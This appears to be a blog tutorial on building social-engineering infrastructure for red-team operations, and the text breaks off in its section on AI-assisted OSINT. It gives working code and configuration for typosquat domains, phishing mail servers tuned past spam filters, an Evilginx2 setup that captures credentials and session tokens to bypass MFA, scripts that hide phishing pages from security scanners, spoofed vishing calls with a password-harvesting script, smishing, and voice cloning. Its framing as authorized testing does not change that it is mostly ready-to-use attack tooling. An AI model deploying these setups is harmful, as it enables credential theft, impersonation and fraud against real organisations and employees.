---
title: "Social Engineering in Red Team Operations: Technical Setup and Tools"
date: "2025-04-01"
tags: ["Red Team", "Social Engineering", "Phishing", "OSINT", "Infrastructure", "Offensive Security"]
---

# Social Engineering in Red Team Operations: Technical Setup and Tools

![Social engineering infrastructure and tools for red teams](/images/social-engineering.png)

## Introduction

Let's talk about social engineering and OSINT in modern red team operations. Despite all the fancy security tech out there, humans still make decisions based on trust, authority, and urgency. That's why social engineering remains one of the most reliable ways to breach an organization's defenses.

But there's a world of difference between amateur social engineering and professional red team operations. Pros don't just send random phishing emails - they build complete, convincing campaigns with robust infrastructure that mimics real threat actors. They're methodical, careful, and focused on operational security.

In this article, I'll walk you through the technical infrastructure needed for effective social engineering campaigns. I'll focus on practical implementations with code examples you can adapt to your own assessments. Whether you're building phishing domains, setting up email infrastructure, or creating convincing landing pages, you'll learn the techniques that make these operations successful.

## Technical Infrastructure Setup

Before sending a single phishing email or making any calls, you need solid infrastructure that's both effective and hard to trace back to you. Here's how to build it.

### Domain Acquisition Strategies

Your domain selection can make or break your social engineering campaign. It's the foundation of your operation, so let's get it right.

#### Aged Domains vs. New Domains

Here's the problem with newly registered domains - security tools flag them immediately. That's why I always prefer aged domains for serious operations:

```bash
# Check domain age with whois
whois example.com | grep "created"
```

When targeting high-value organizations, I recommend:
- Looking for expired domains that had a good reputation
- Finding domains that previously belonged to vendors or partners of your target
- Using typosquatted variations of legitimate domains that will look familiar to users

Here's a script I use to generate typosquatting domains that look convincing:

```python
import itertools

def generate_typosquats(domain):
    """Generate typosquatting variations of a domain"""
    name, tld = domain.split('.')
    typos = []

    # Character substitution (e.g., 'o' to '0')
    subs = {'o': '0', 'i': '1', 'l': '1', 's': '5', 'e': '3', 'a': '4'}
    for char, replacement in subs.items():
        if char in name:
            typos.append(name.replace(char, replacement) + '.' + tld)

    # Character swaps
    for i in range(len(name) - 1):
        swapped = name[:i] + name[i+1] + name[i] + name[i+2:]
        typos.append(swapped + '.' + tld)

    # Character omission
    for i in range(len(name)):
        typos.append(name[:i] + name[i+1:] + '.' + tld)

    # Character duplication
    for i in range(len(name)):
        typos.append(name[:i] + name[i] + name[i:] + '.' + tld)

    # Additional TLDs
    common_tlds = ['com', 'net', 'org', 'io', 'co']
    for new_tld in common_tlds:
        if new_tld != tld:
            typos.append(name + '.' + new_tld)

    return typos

# Example usage
target_domain = "company.com"
typosquats = generate_typosquats(target_domain)
print(f"Generated {len(typosquats)} typosquatting domains for {target_domain}:")
for domain in typosquats[:10]:  # Show first 10
    print(f" - {domain}")
```

For high-value targets, consider:
- Buying expired domains with existing reputation
- Looking for domains that previously belonged to vendors/partners
- Acquiring typosquatted variations of legitimate domains

#### Domain Infrastructure Considerations

When setting up your domain, there are several critical details you need to get right:

1. **Use privacy protection services** - You don't want your real info in WHOIS records
2. **Choose your registrar carefully** - Some will suspend domains at the first complaint, others won't
3. **Think about geography** - Some TLDs are less responsive to takedown requests
4. **Set up complete DNS records** - Missing records are a red flag to security teams

Here's a basic DNS setup I use for creating convincing domains:

```bash
# Basic DNS records you should configure
# A record
example.com.     IN A      203.0.113.10

# MX records
example.com.     IN MX 10  mail.example.com.
mail.example.com. IN A     203.0.113.11

# SPF record (helps with email deliverability)
example.com.     IN TXT    "v=spf1 ip4:203.0.113.0/24 ~all"

# DKIM record (for email authentication)
mail._domainkey.example.com. IN TXT "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5N3lnvvrYgPCRSoqn+awTpE+iGYcKBtnAZ/HB0AjvBSR+Mw3VwsP0xX/U8QsP+FeYgF0BkYVfQ8JEwxUAK8B+ZNgRr5UfUlbzjlOYxunqZkGZRfUeGG/X5xQQZVRUcQ9+oofEYiYPLH2pVroWOkAJqIJXpwq2iKC2k3m1BEGCzwIDAQAB"

# DMARC record (email authentication policy)
_dmarc.example.com. IN TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com"
```

The key is making your domain look legitimate in every possible way. Missing any of these records is like putting up a red flag saying "this is a phishing domain!"

#### Target Organization Email & Template Reconnaissance

Before creating phishing campaigns, gather intelligence on the target organization's actual email templates, websites, and communication styles. This makes your social engineering much more convincing.

##### Email Header Analysis

Collect legitimate emails from the target organization and analyze their headers:

```bash
# Save email as .eml file and analyze headers
cat legitimate_email.eml | grep -i "received:"
cat legitimate_email.eml | grep -i "authentication-results:"
cat legitimate_email.eml | grep -i "x-"
```

Look for:
- Email servers they use (Office 365, Google Workspace, on-prem)
- Custom headers specific to their organization
- Authentication mechanisms they implement
- Email gateway or security solutions

##### Email Template Collection

Sign up for their newsletters, customer portals, or support systems to collect legitimate templates:

```python
import imaplib
import email
import os

def save_target_emails(email_address, password, target_domain):
    # Connect to IMAP server (for Gmail in this example)
    mail = imaplib.IMAP4_SSL("imap.gmail.com")
    mail.login(email_address, password)
    mail.select("inbox")

    # Search for emails from target domain
    status, messages = mail.search(None, f'FROM "@{target_domain}"')

    # Create directory for templates
    os.makedirs(f"templates/{target_domain}", exist_ok=True)

    # Download emails
    for num in messages[0].split():
        status, data = mail.fetch(num, '(RFC822)')
        raw_email = data[0][1]

        # Parse the raw email
        msg = email.message_from_bytes(raw_email)

        # Save the email
        with open(f"templates/{target_domain}/email_{num.decode()}.eml", 'wb') as f:
            f.write(raw_email)

        # If email has HTML part, save it separately
        for part in msg.walk():
            if part.get_content_type() == "text/html":
                with open(f"templates/{target_domain}/email_{num.decode()}.html", 'wb') as f:
                    f.write(part.get_payload(decode=True))

    mail.close()
    mail.logout()
```

##### Website Template Analysis

Tools like [SingleFile](https://github.com/gildas-lormeau/SingleFile) can help capture complete website templates:

```bash
# Install SingleFile CLI
npm install -g single-file-cli

# Save a complete website for template analysis
single-file https://target-company.com/login --output-directory ./captured-templates/
```

For more dynamic pages like portals and login screens, use Selenium to capture them:

```python
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time

def capture_authenticated_templates(url, username, password):
    options = Options()
    options.headless = True
    driver = webdriver.Firefox(options=options)

    # Login to the page
    driver.get(url)
    driver.find_element_by_id("username").send_keys(username)
    driver.find_element_by_id("password").send_keys(password)
    driver.find_element_by_id("login-button").click()

    # Wait for page to load
    time.sleep(5)

    # Save the HTML
    with open("authenticated_template.html", "w") as f:
        f.write(driver.page_source)

    # Take screenshot
    driver.save_screenshot("authenticated_template.png")

    driver.quit()
```

##### Document Repository Analysis

Look for document templates, letterheads, and branding guides:

```bash
# Using theharvester to find publicly available documents
python3 theHarvester.py -d company.com -b google -l 500 -f results.html

# Using metagoofil for document metadata
python3 metagoofil.py -d company.com -t pdf,doc,xls,ppt -l 100 -n 50 -o company_docs -f results.html
```

Many organizations have design guidelines or brand resources available on their websites. Look for:
- Style guides
- Logo packs
- Font specifications
- Color schemes
- Email signature templates

### Email Infrastructure Setup

Your email setup can make or break your phishing campaign. Modern security tools will check for proper email configuration, so you can't cut corners here.

#### Basic Email Server Setup

For most operations, I use a VPS with Postfix. It's reliable and gives you complete control:

```bash
# Install postfix and related tools
apt-get update
apt-get install -y postfix opendkim opendkim-tools mailutils

# Configure Postfix
cat > /etc/postfix/main.cf << EOL
# Basic Settings
myhostname = mail.example.com
mydomain = example.com
myorigin = \$mydomain
mydestination = \$myhostname, \$mydomain, localhost.\$mydomain, localhost
relayhost =
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = all

# TLS parameters - crucial for avoiding detection
smtpd_tls_cert_file=/etc/letsencrypt/live/mail.example.com/fullchain.pem
smtpd_tls_key_file=/etc/letsencrypt/live/mail.example.com/privkey.pem
smtpd_use_tls=yes
smtpd_tls_auth_only = yes
smtp_tls_security_level = may
smtpd_tls_security_level = may
smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth
smtpd_sasl_auth_enable = yes

# DKIM configuration
milter_protocol = 2
milter_default_action = accept
smtpd_milters = inet:localhost:12301
non_smtpd_milters = inet:localhost:12301
EOL

# Set up DKIM
mkdir -p /etc/opendkim/keys/example.com
cd /etc/opendkim/keys/example.com
opendkim-genkey -s mail -d example.com
chown opendkim:opendkim mail.private
```

For serious operations where deliverability really matters, I sometimes use legitimate email providers like Amazon SES or Mailgun. Just be aware that they monitor for abuse, so you'll need to be extra careful and gradually warm up your sending.

#### DKIM/SPF/DMARC Setup

These three authentication protocols are no longer optional - they're essential for any phishing campaign that wants to reach the inbox:

1. **SPF (Sender Policy Framework)** tells receiving servers which IPs are allowed to send mail for your domain:

```bash
# SPF Record Example - add this to your DNS
example.com. IN TXT "v=spf1 ip4:203.0.113.10 ~all"
```

2. **DKIM (DomainKeys Identified Mail)** adds a cryptographic signature to verify your emails weren't tampered with:

```bash
# After generating keys with opendkim-genkey, add this to DNS
mail._domainkey.example.com. IN TXT "v=DKIM1; k=rsa; p=YOUR_PUBLIC_KEY_HERE"
```

3. **DMARC (Domain-based Message Authentication)** ties it all together by telling receivers what to do if SPF or DKIM checks fail:

```bash
# DMARC record example - add this to DNS
_dmarc.example.com. IN TXT "v=DMARC1; p=none; rua=mailto:dmarc-reports@example.com"
```

Pro tip: Use `p=none` in your DMARC record during campaigns. This tells receivers to still deliver emails that fail checks, but to send you reports about them. It helps you diagnose deliverability issues without derailing your campaign.

#### Avoiding Spam Filters

Modern spam filters are sophisticated beasts. They use everything from content analysis to sender reputation. Here's how to stay under their radar:

1. **Warm up your IP gradually** - Don't go from zero to thousands of emails overnight. Start with a few emails daily and slowly increase volume.

2. **Use temporary email services for testing** - Never test phishing emails by sending them to your own Gmail or Outlook accounts, as this can link your infrastructure to your identity:
   - [Temp-Mail](https://temp-mail.org/) - Provides disposable email addresses
   - [10MinuteMail](https://10minutemail.com/) - Short-lived throwaway addresses
   - [Guerrilla Mail](https://www.guerrillamail.com/) - No registration required

3. **Make your content look legitimate**:
   - Include proper headers and footers like real companies use
   - Avoid obvious spam trigger words
   - Keep a good balance of text to images (too many images is suspicious)
   - Always include unsubscribe links (even for phishing)
   - Personalize emails when possible
   - Use proper HTML formatting

### Landing Page Infrastructure

Your phishing landing pages are where the magic happens. They need to look 100% legitimate while efficiently capturing credentials or deploying your payloads without raising suspicion.

#### Using Evilginx2 for Advanced Phishing

Traditional phishing sites often fail against modern security controls like Multi-Factor Authentication (MFA). That's where Evilginx2 comes in - it's a powerful man-in-the-middle framework that can capture not just credentials, but authentication tokens as well.

Here's how to set it up for a red team operation:

```bash
# Install dependencies
apt-get update
apt-get install -y git make golang-go

# Set up Go environment
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin

# Clone and build Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Create a systemd service for persistence
cat > /etc/systemd/system/evilginx2.service << EOL
[Unit]
Description=Evilginx2 Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/bin/evilginx -p ./phishlets
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOL

# Enable and start the service
systemctl daemon-reload
systemctl enable evilginx2
systemctl start evilginx2
```

The real power of Evilginx2 is in its phishlets - specialized configurations for specific target services (Microsoft, Google, etc.). Here's a sample CLI session to set up a Microsoft 365 phishing campaign:

```
# Configure domain and IP
config domain your-phishing-domain.com
config ip 203.0.113.10

# Set up a phishlet for Microsoft
phishlets get microsoft

# Enable the phishlet with your domain
phishlets enable microsoft your-phishing-domain.com

# Create a lure for Microsoft login
lures create microsoft

# Configure the lure with a convincing path and redirect
lures edit 0 path /secure-login
lures edit 0 redirect https://office.com

# Get the phishing URL to distribute
lures get-url 0
```

What makes Evilginx2 so effective:

1. **MFA Bypass** - It sits between the victim and the real site, capturing both credentials and session tokens
2. **Real-time Session Hijacking** - You can take over active sessions, not just collect credentials
3. **Legitimate SSL Certificates** - Automatically provisions Let's Encrypt certs
4. **Customizable Lures** - Create different entry points for different target groups

For high-security targets, consider these advanced tips:

- **Domain aging is crucial** - Set up your domains at least 7-14 days before your campaign so spam filters that crawl the web have time to build trust for your domain
- Keep campaigns short (24-48 hours) to avoid detection
- Modify the phishlets to remove any known detection fingerprints
- Host on residential IPs to avoid commercial hosting detection

#### GoPhish for Email Campaigns

```bash
# Clone the repository
cd gophish-deploy

# Run the deployment script with your domain
python GoPhish-Deploy.py your-phishing-domain.com
```

This script:
1. Sets up a complete GoPhish installation with proper SSL
2. Configures secure defaults and removes identifiable headers
3. Changes tracking parameters for better evasion
4. Creates a systemd service for auto-start

Once deployed, you can access the admin panel through an SSH tunnel:

```bash
# Set up an SSH tunnel for security
ssh root@<your-server-ip> -L 3333:127.0.0.1:3333

# Then access the admin panel at:
# https://127.0.0.1:3333
# Default credentials: admin / gophish@123
```

From there, you can create email templates, landing pages, and user groups for your campaign. The integration between GoPhish and Evilginx2 is seamless - just use your Evilginx2 lure URLs in your GoPhish email templates.

#### Evasion Techniques for Phishing Infrastructure

Security tools of M$ and other providers are getting better at detecting phishing pages. Here are some ways to stay under the radar:

1. **IP-based filtering** to block security companies and researchers:

```php
<?php
// Block security companies and known scanners
$blocked_ips = [
    '192.0.2.', // Example security company range
    '198.51.100.', // Example security scanner range
];

$visitor_ip = $_SERVER['REMOTE_ADDR'];
foreach ($blocked_ips as $blocked) {
    if (strpos($visitor_ip, $blocked) === 0) {
        // Redirect to legitimate site
        header('Location: https://google.com');
    exit;
    }
}

// Continue to phishing page if not blocked
include 'real_phishing_page.html';
?>
```

2. **Browser fingerprinting** to detect security tools:

```javascript
// Simple browser fingerprinting
function checkBrowser() {
    // Check for headless browsers or automation tools
    if (navigator.webdriver || navigator.plugins.length === 0) {
        window.location = "https://legitimate-site.com";
        return;
    }

    // Check screen dimensions (many security tools use small windows)
    if (screen.width < 1000 || screen.height < 600) {
        window.location = "https://legitimate-site.com";
        return;
    }

    // Check if DevTools is open
    if (window.outerHeight - window.innerHeight > 200) {
        window.location = "https://legitimate-site.com";
        return;
    }
}

// Run checks when page loads
document.addEventListener('DOMContentLoaded', checkBrowser);
```

3. **Regional targeting** - Only show phishing pages to visitors from specific countries:

```php
<?php
// Get visitor's country
$country = file_get_contents('https://ipinfo.io/' . $_SERVER['REMOTE_ADDR'] . '/country');

// Only target specific countries
$target_countries = ['US', 'UK', 'BG', 'RO'];

if (!in_array(trim($country), $target_countries)) {
    header('Location: https://google.com');
    exit;
}

// Continue to phishing page if visitor is from target country
include 'real_phishing_page.html';
?>
```


### Voice Phishing Infrastructure

#### Twilio for Voice Calls

For vishing (voice phishing) campaigns, Twilio provides a robust, programmable API:

```python
from twilio.rest import Client

# Twilio credentials
account_sid = 'your_account_sid'
auth_token = 'your_auth_token'
client = Client(account_sid, auth_token)

def make_vishing_call(target_number, script_id, spoofed_number=None):
    """Make a vishing call with optional caller ID spoofing"""

    # URL to TwiML script that controls call flow
    twiml_url = f"https://your-server.com/vishing_scripts/{script_id}.xml"

    # Create the call
    call = client.calls.create(
        url=twiml_url,
        to=target_number,
        from_=spoofed_number if spoofed_number else 'your_twilio_number',
        # Optional recording
        record=True,
        # Optional machine detection
        machine_detection='Enable'
    )

    return call.sid

# Example call to the function
call_id = make_vishing_call("+15551234567", "it_support", "+15557654321")
print(f"Started vishing call with ID: {call_id}")
```

The TwiML script referenced above controls what happens during the call:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="alice">Hello, this is Sarah from IT Security.</Say>
    <Say voice="alice">We've detected unusual activity on your account.</Say>
    <Say voice="alice">To secure your account, please provide your current password.</Say>
    <Record maxLength="30" playBeep="true" transcribe="true" transcribeCallback="/transcribe_callback"/>
    <Say voice="alice">Thank you for your cooperation. We'll reset your account and contact you shortly.</Say>
</Response>
```

#### Caller ID Spoofing Technologies and Services

Caller ID spoofing is a critical component of effective vishing campaigns. Here are several approaches:

1. **SIP Trunking Providers**:
   - Telnyx - Offers programmable SIP trunking with customizable caller ID
   - Twilio - Limited caller ID customization within their guidelines
   - Plivo - Similar to Twilio with flexible API

2. **Dedicated Spoofing Services**:
   - SpoofCard - Popular commercial service for one-off calls
   - SpoofTel - Offers both web and app-based spoofing

3. **VoIP Software with Spoofing Capabilities**:
   - Asterisk with SIP configuration - Open-source solution requiring technical setup
   - FreePBX - More user-friendly Asterisk-based system
   - 3CX - Commercial PBX software with caller ID customization

4. **Advanced Tactics**:
   - Neighbor Spoofing - Using a number with the same area code as the target
   - Organization Spoofing - Making calls appear to come from within the target's organization
   - Toll-Free Spoofing - Using toll-free numbers which often bypass call blocking

For red team operations, the most effective approach is combining SIP trunking with custom PBX software. This provides the best balance of flexibility, reliability, and believability.

Legal note: Caller ID spoofing regulations vary by country. In the US, the Truth in Caller ID Act prohibits spoofing with the intent to defraud or cause harm, but allows legitimate uses (like red team assessments with proper authorization).

### SMS Spoofing Infrastructure

SMS phishing (smishing) is highly effective due to the limited security context on mobile devices.

#### Twilio for SMS

Here's a basic Twilio SMS setup:

```python
from twilio.rest import Client

# Twilio credentials
account_sid = 'your_account_sid'
auth_token = 'your_auth_token'
client = Client(account_sid, auth_token)

def send_smishing_message(target_number, message, sender=None):
    """Send an SMS phishing message"""

    # Send the message
    message = client.messages.create(
        body=message,
        from_=sender if sender else 'your_twilio_number',
        to=target_number
    )

    return message.sid

# Example smishing message
target = "+15551234567"
message = "ALERT: Your account has been temporarily limited. Verify your identity: http://secure-verify.example.com/v?id=12345"
sender = "SecurityAlert"  # Some carriers allow alphanumeric sender IDs

message_id = send_smishing_message(target, message, sender)
print(f"Sent smishing message with ID: {message_id}")
```

For more stealthy operations, consider bulk SMS services that offer better anonymity or alphanumeric sender IDs.

## OSINT Tools for Target Research

Effective social engineering requires thorough intelligence gathering. Let's explore tools and techniques for automated reconnaissance.

### LinkedIn Reconnaissance Tools

LinkedIn is an absolute goldmine for social engineering preparation. Most professionals have detailed profiles that reveal organizational structure, reporting relationships, and even which tools and systems they use. Let's look at specialized tools for gathering this data:

#### Crosslinked

[Crosslinked](https://github.com/m8r0wn/CrossLinked) is an excellent LinkedIn enumeration tool that extracts employee names from an organization without requiring authentication:

```bash
# Install Crosslinked
git clone https://github.com/m8r0wn/CrossLinked
cd CrossLinked
pip3 install -r requirements.txt

# Basic usage - search for employees and output to CSV
python3 crosslinked.py -f "{first}.{last}@company.com" "Target Company" -o target_employees.csv

# More comprehensive search with additional sources
python3 crosslinked.py "Target Company" -f "{first}.{last}@company.com" -e -j -s
```

This tool scrapes public LinkedIn data to extract employee names, then formats email addresses according to your specified pattern.

#### Linkedin2Username

[Linkedin2Username](https://github.com/initstring/linkedin2username) is another excellent tool that expands on basic employee information gathering:

```bash
git clone https://github.com/initstring/linkedin2username
cd linkedin2username
pip3 install -r requirements.txt

# Basic usage with authenticated LinkedIn account
python3 linkedin2username.py -u your_linkedin@email.com -c "Target Company" -s 50
```

This tool requires a valid LinkedIn account but yields more accurate results and includes title information.

### Email Verification Tools

After obtaining potential email addresses, you need to verify which ones actually exist. Several tools specialize in email validation for O365 environments:

#### O365 Email Validation

##### O365-Spray

[O365-Spray](https://github.com/0xZDH/o365spray) can validate email addresses without triggering account lockouts:

```bash
# Install O365-Spray
git clone https://github.com/0xZDH/o365spray
cd o365spray
pip3 install -r requirements.txt

# Validate a list of email addresses
python3 o365spray.py --validate -U emails.txt --output valid_emails.txt
```

##### MailSniper

[MailSniper](https://github.com/dafthack/MailSniper) is a PowerShell tool for searching through email accounts:

```powershell
# Import the module
Import-Module .\MailSniper.ps1

# Verify if users exist in Office 365
Invoke-UsernameHarvestOWA -UserList .\users.txt -Domain company.com -OutFile valid_users.txt
```

#### General Email Validation

For broader email validation, consider these tools:

- **[Email Hippo](https://tools.emailhippo.com/)** - Provides bulk email verification
- **[Hunter.io](https://hunter.io)** - Helps find email patterns at companies
- **[Holehe](https://github.com/megadose/holehe)** - One of my favorites: Checks if an email is registered across 120+ websites

```bash
# Example of using Holehe
pip3 install holehe
holehe user@example.com --only-used
```

### Social Media OSINT Tools

For comprehensive social media intelligence, several specialized tools can dramatically improve your reconnaissance process:

#### Sherlock
[Sherlock](https://github.com/sherlock-project/sherlock) hunts for usernames across 300+ social networks:

```bash
# Install Sherlock
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
pip3 install -r requirements.txt

# Search for a specific username
python3 sherlock.py username

# Search for multiple usernames and save to CSV
python3 sherlock.py username1 username2 --csv
```

#### Social Analyzer
[Social Analyzer](https://github.com/qeeqbox/social-analyzer) is another powerful tool for finding accounts across 900+ platforms:

```bash
# Install Social Analyzer
git clone https://github.com/qeeqbox/social-analyzer.git
cd social-analyzer
pip3 install -r requirements.txt

# Search for username across platforms
python3 app.py --username "target_username" --metadata --output json
```

#### Instaloader
[Instaloader](https://github.com/instaloader/instaloader) extracts detailed information from Instagram profiles:

```bash
# Install Instaloader
pip3 install instaloader

# Download all public posts from a user
instaloader profile target_username

# Extract followers and followees
instaloader --login=your_username profile target_username -f
```

#### TWINT
[TWINT](https://github.com/twintproject/twint) is an advanced Twitter scraping tool that doesn't use Twitter's API:

```bash
# Install TWINT
pip3 install twint

# Search for tweets from a specific user
twint -u target_username -o tweets.csv --csv

# Search for tweets containing specific keywords
twint -s "company name" -o company_tweets.csv --csv
```

#### Creepy
[Creepy](https://github.com/ilektrojohn/creepy) gathers geolocation-related information from social networks:

```bash
# Install Creepy (requires Python 2.7)
git clone https://github.com/ilektrojohn/creepy.git
cd creepy
pip install -r requirements.txt

# Run the application
python creepy.py
```

#### OSINT Framework
The [OSINT Framework](https://osintframework.com/) is a web-based platform that categorizes and links to hundreds of OSINT tools, making it easier to find the right tool for specific needs.

### Comprehensive OSINT Frameworks

Beyond individual tools, several frameworks provide integrated OSINT capabilities:

#### SpiderFoot

[SpiderFoot](https://github.com/smicallef/spiderfoot) automates OSINT collection across hundreds of data sources:

```bash
# Install SpiderFoot
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip3 install -r requirements.txt

# Run the web interface
python3 ./sf.py -l 127.0.0.1:5001
```

From the web interface, you can scan domains, IP addresses, or email addresses to build comprehensive profiles of individuals and organizations.

#### Maltego

[Maltego](https://www.maltego.com/) is a powerful data mining tool that provides a visual link analysis for connecting information for OSINT investigations:

```bash
# Maltego is available as a free Community Edition or paid versions
# Download from: https://www.maltego.com/downloads/

# After installation, use Transforms to gather intelligence
# Examples of useful transforms:
# - Email to Person
# - Person to Social Media Accounts
# - Company to Employees
# - Domain to Network Information
```

#### Recon-ng

[Recon-ng](https://github.com/lanmaster53/recon-ng) is a full-featured reconnaissance framework with modules for various data sources:

```bash
# Install Recon-ng
git clone https://github.com/lanmaster53/recon-ng.git
cd recon-ng
pip install -r REQUIREMENTS

# Start Recon-ng
./recon-ng

# Basic usage within Recon-ng
> marketplace search
> marketplace install all
> workspaces create target_company
> modules load recon/domains-contacts/whois_pocs
> options set SOURCE target_company.com
> run
```

#### TheHarvester

[TheHarvester](https://github.com/laramies/theHarvester) gathers emails, names, subdomains, IPs, and URLs from multiple public sources:

```bash
# Install TheHarvester
git clone https://github.com/laramies/theHarvester
cd theHarvester
pip3 install -r requirements.txt

# Basic usage
python3 theHarvester.py -d company.com -b all
```

By combining these tools, you can build detailed profiles of target organizations and individuals, significantly improving the effectiveness of your social engineering campaigns.

### Additional Specialized OSINT Tools

#### Dark Web & Breach Data Tools

##### Dehashed
[Dehashed](https://dehashed.com/) is a paid service that provides access to breach data and can be used for credential discovery:

```bash
# Using dehashed API (requires paid subscription)
curl -X GET 'https://api.dehashed.com/search?query=domain:example.com' \
  -H 'Accept: application/json' \
  -u 'email@example.com:your_api_key'
```

##### H8mail
[H8mail](https://github.com/khast3x/h8mail) is an email OSINT tool that can query multiple breach databases:

```bash
# Install H8mail
pip3 install h8mail

# Basic usage
h8mail -t target@example.com

# Using with your API keys for better results
h8mail -t target@example.com -c h8mail_config.ini
```

#### Domain & Website OSINT

##### Amass
[Amass](https://github.com/OWASP/Amass) performs network mapping of attack surfaces and external asset discovery:

```bash
# Install Amass
go install -v github.com/owasp-amass/amass/v3/...@master

# Basic enumeration
amass enum -d example.com

# Passive mode for stealthier reconnaissance
amass enum -passive -d example.com -o results.txt
```

##### Photon
[Photon](https://github.com/s0md3v/Photon) is an incredibly fast crawler designed for OSINT:

```bash
# Install Photon
git clone https://github.com/s0md3v/Photon.git
cd Photon

# Basic crawling
python3 photon.py -u https://example.com -o output_directory

# Extract only emails
python3 photon.py -u https://example.com -o output_directory --only-urls
```

#### Document Metadata Analysis

##### FOCA
[FOCA](https://github.com/ElevenPaths/FOCA) (Fingerprinting Organizations with Collected Archives) extracts metadata from documents found on websites:

```bash
# FOCA is a Windows application with GUI interface
# Download from https://github.com/ElevenPaths/FOCA/releases
```

##### Metagoofil
[Metagoofil](https://github.com/laramies/metagoofil) extracts metadata from public documents:

```bash
# Install Metagoofil
git clone https://github.com/laramies/metagoofil
cd metagoofil

# Basic usage
python3 metagoofil.py -d example.com -t pdf,doc,xls -l 100 -n 10 -o results
```

#### Phone Number OSINT

##### PhoneInfoga
[PhoneInfoga](https://github.com/sundowndev/phoneinfoga) is an advanced phone number OSINT framework:

```bash
# Install PhoneInfoga
go install github.com/sundowndev/phoneinfoga/v2/cmd/phoneinfoga@latest

# Basic scan
phoneinfoga scan -n "+1234567890"

# Start web client
phoneinfoga serve
```

##### Ignorant
[Ignorant](https://github.com/megadose/ignorant) verifies phone numbers across multiple platforms:

```bash
# Install Ignorant
pip3 install ignorant

# Check a phone number
ignorant +1234567890
```

#### GEOINT Tools

##### Creepy
[Creepy](https://github.com/ilektrojohn/creepy) collects geolocation data from social networks:

```bash
# Install dependencies
sudo apt-get install python-qt4 python-pip
pip install pytz python-dateutil tweepy python-instagram exifread beautifulsoup

# Clone and run
git clone https://github.com/ilektrojohn/creepy
cd creepy
python creepy.py
```

##### GeoSocial Footprint
[GeoSocial Footprint](https://github.com/Carve/GeoSocial-Footprint) visualizes social media location data on maps:

```bash
# Clone and set up
git clone https://github.com/Carve/GeoSocial-Footprint.git
cd GeoSocial-Footprint
```

#### People Search Tools

##### WhatsMyName
[WhatsMyName](https://github.com/WebBreacher/WhatsMyName) discovers usernames across many websites:

```bash
# Clone the repository
git clone https://github.com/WebBreacher/WhatsMyName.git
cd WhatsMyName/whatsmyname

# Run with Python
python3 whatsmyname.py -u username
```

##### Maigret
[Maigret](https://github.com/soxoj/maigret) finds profiles by username and tracks metadata from discovered accounts:

```bash
# Install Maigret
pip3 install maigret

# Basic search
maigret username

# Advanced search with recursive checking
maigret username --recursive
```

#### Deep and Dark Web OSINT

##### OnionScan
[OnionScan](https://github.com/s-rah/onionscan) scans onion services for security issues and operational security errors:

```bash
# Install dependencies and OnionScan
go get github.com/s-rah/onionscan

# Basic scan
onionscan onionaddress.onion
```

##### TorBot
[TorBot](https://github.com/DedSecInside/TorBot) is an OSINT tool for Dark Web exploration:

```bash
# Clone TorBot
git clone https://github.com/DedSecInside/TorBot.git
cd TorBot

# Install dependencies and run
pip3 install -r requirements.txt
python3 torbot -h
```

### Voice Synthesis with ElevenLabs.io

For vishing campaigns, voice synthesis technology has become remarkably advanced. [ElevenLabs](https://elevenlabs.io/) provides near-perfect voice cloning and generation that can be used in social engineering calls.

#### Capabilities and Dangers

ElevenLabs offers:
- Voice cloning from small audio samples
- Multilingual voice generation
- Emotional and tonal variations
- High realism that passes human detection

The implications for social engineering are significant:
- A small sample of a CEO's voice from a public earnings call can be cloned
- This clone can then deliver convincing instructions to employees
- The cloned voice can express urgency or authority convincingly

#### Implementation in Red Team Operations

For authorized red team operations, ElevenLabs can be integrated with your existing call systems:

```python
import requests
import json
from twilio.rest import Client

def generate_voice_message(text, voice_id):
    """Generate voice message using ElevenLabs API"""
    url = f"https://api.elevenlabs.io/v1/text-to-speech/{voice_id}"

    headers = {
        "Accept": "audio/mpeg",
        "Content-Type": "application/json",
        "xi-api-key": "YOUR_ELEVENLABS_API_KEY"
    }

    data = {
        "text": text,
        "model_id": "eleven_monolingual_v1",
        "voice_settings": {
            "stability": 0.5,
            "similarity_boost": 0.75
        }
    }

    response = requests.post(url, json=data, headers=headers)

    # Save the audio file
    with open("message.mp3", "wb") as f:
        f.write(response.content)

    return "message.mp3"
```

The dangers of this technology in unauthorized hands are severe:
- Executives' voices could be cloned for fraudulent wire transfers
- False emergency messages could be created to manipulate employees
- Blackmail scenarios can be manufactured with fabricated audio

As a security professional, only use these technologies within explicitly authorized engagements, with full disclosure to the client about the techniques employed.

## Automation Techniques for OSINT

The sheer volume of data that needs to be processed for effective OSINT can be overwhelming. Large Language Models (LLMs) and specialized AI tools have revolutionized the way we approach OSINT for social engineering. Here's how to leverage them efficiently.

### LLM-Powered OSINT Tools

#### ChatGPT for OSINT Data Processing

LLMs like ChatGPT excel at processing and summarizing large amounts of OSINT data:

```
# Effective OSINT prompting template for ChatGPT

I need to extract key information from this LinkedIn profile data for a security assessment. Please identify:

1. Technical skills mentioned
2. Current and previous employers
3. Technologies the person works with
4. Reporting relationships mentioned
5. Projects they've worked on
6. Educational background
7. Professional certifications

Here's the profile text:
[PASTE PROFILE TEXT HERE]

Format the output as JSON that I can import into my OSINT database.
```

For aggregating news and public information about a company:

```
I'm conducting authorized OSINT research on [COMPANY NAME] for a security assessment. Please help me identify:

1. Recent news mentions (last 6 months)
2. Key executives and their backgrounds
3. Recent acquisitions or partnerships
4. Technologies they're known to use
5. Office locations
6. Known security incidents

Based on publicly available information, create a summary that organizes this intelligence in a way that would help understand their security posture.
```

#### OSINTgpt

[OSINTgpt](https://github.com/hackergautam/osintgpt) is an open-source tool that leverages GPT models specifically for OSINT workflows:

```bash
# Clone and set up OSINTgpt
git clone https://github.com/hackergautam/osintgpt
cd osintgpt
pip install -r requirements.txt

